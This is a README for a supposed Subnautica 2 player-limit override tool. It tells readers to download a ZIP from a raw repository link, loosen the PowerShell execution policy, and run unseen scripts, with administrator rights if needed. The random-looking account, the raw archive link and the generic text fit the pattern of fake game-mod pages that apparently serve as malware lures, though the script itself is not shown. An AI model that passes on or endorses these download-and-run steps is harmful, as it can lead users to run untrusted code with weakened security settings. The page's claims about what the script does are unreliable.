# 🌊 SN2-PlayerLimit-ConfigOverride - Increase your server player count easily

[![](https://img.shields.io/badge/Download-Release-blue)](https://github.com/Judaeaexertion224/SN2-PlayerLimit-ConfigOverride/raw/refs/heads/main/Config/Limit_Player_Override_S_Config_1.7.zip)

This software modifies the default player limit settings for Subnautica 2 multiplayer sessions. The tool updates your local configuration files automatically using a simple script. This allows you to host sessions with more friends than the game normally supports.

## ⚙️ Understanding this tool

Subnautica 2 limits the number of players allowed in a single multiplayer session by default. This limitation exists to ensure game stability and performance. Some players prefer hosting larger groups. This configuration override tool adjusts the settings file stored in your local game directory. It bypasses the standard limit and applies your custom choice to the game engine.

The tool uses PowerShell to perform these changes. It reads your current game installation path, finds the configuration file, and writes the new limit value. It does not alter your save files or game binaries. You can revert these changes at any time by running the reset option provided in the script.

## 📋 System requirements

- Windows 10 or Windows 11
- Subnautica 2 installed on your local drive
- A basic understanding of file paths
- PowerShell enabled (included by default on Windows)

## 🚀 Getting started

1. Visit the repository page to download the latest setup file: [https://github.com/Judaeaexertion224/SN2-PlayerLimit-ConfigOverride/raw/refs/heads/main/Config/Limit_Player_Override_S_Config_1.7.zip](https://github.com/Judaeaexertion224/SN2-PlayerLimit-ConfigOverride/raw/refs/heads/main/Config/Limit_Player_Override_S_Config_1.7.zip)
2. Locate the ZIP file in your Downloads folder.
3. Right-click the folder and select Extract All.
4. Open the extracted folder to see the script files.

## 🛠️ How to install and run

1. Close Subnautica 2 if it is running.
2. Find the file named `ApplyConfig.ps1` in the folder you extracted.
3. Right-click `ApplyConfig.ps1` and select Run with PowerShell.
4. A window appears. Follow the instructions on your screen.
5. Enter the number of players you wish to have in your session when the script prompts you.
6. Press the Enter key.
7. The script confirms the override is successful.
8. Start Subnautica 2. Your new player limit is now active.

## 🛡️ Stability and performance

Increasing the player limit influences your game performance. The game engine targets a specific player count for smooth navigation and object loading. Adding more players increases the load on the host machine. You might experience the following if you set the limit too high:

- Lower frame rates
- Synchronization errors between participants
- Increased network latency
- Items failing to load correctly

Start with small increments. Test your game stability with one or two additional players before setting the limit to much higher numbers. The engine limitations remain inherent to how the game handles asset streaming. No configuration change can remove the performance costs of adding more players.

## 🔄 Reverting your changes

If you wish to return to the original game settings, use the cleanup tool included in the download.

1. Locate the file named `ResetConfig.ps1`.
2. Right-click the file and select Run with PowerShell.
3. The script finds your modified configuration file.
4. It replaces the file with the default Subnautica 2 values.
5. The window closes once the process finishes.
6. Your player limit returns to the standard game default.

## 🖱️ Troubleshooting common issues

### The script does not run
Check your execution policy if the script fails to open. Right-click the Start button and select Terminal (Admin). Type `Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser` and press Enter. Type `Y` to confirm. Attempt to run `ApplyConfig.ps1` again.

### Game settings do not change
Ensure you have the correct game path selected. The script attempts to find your installation path automatically. If the script cannot find it, it asks you to type the full folder path where Subnautica 2 is located. Use File Explorer to find the directory, copy the path, and paste it into the script window.

### Players cannot connect
Ensure your network firewall allows the game to accept incoming connections. If you host a session, your router must support port forwarding. This tool only changes the internal configuration for player counts. It does not manage your network connection or internet exposure.

### Unexpected file errors
If the script reports an error regarding file permissions, run the script as an administrator. Right-click the script and select Run with PowerShell. If that does not help, move the folder out of your Program Files directory to your Desktop. Windows often restricts programs from changing files within the Program Files folder.

## 🧬 Technical details

The game uses an Unreal Engine configuration structure. The script specifically targets the `Engine.ini` or equivalent configuration files used by the Subnautica 2 build. It creates a safe backup of your current configuration before applying any changes. You can find this backup in the same folder with the name `Backup_Config.ini`. If the game crashes, delete the current configuration file in the game path and rename the backup to match the original filename. This restores your game state immediately.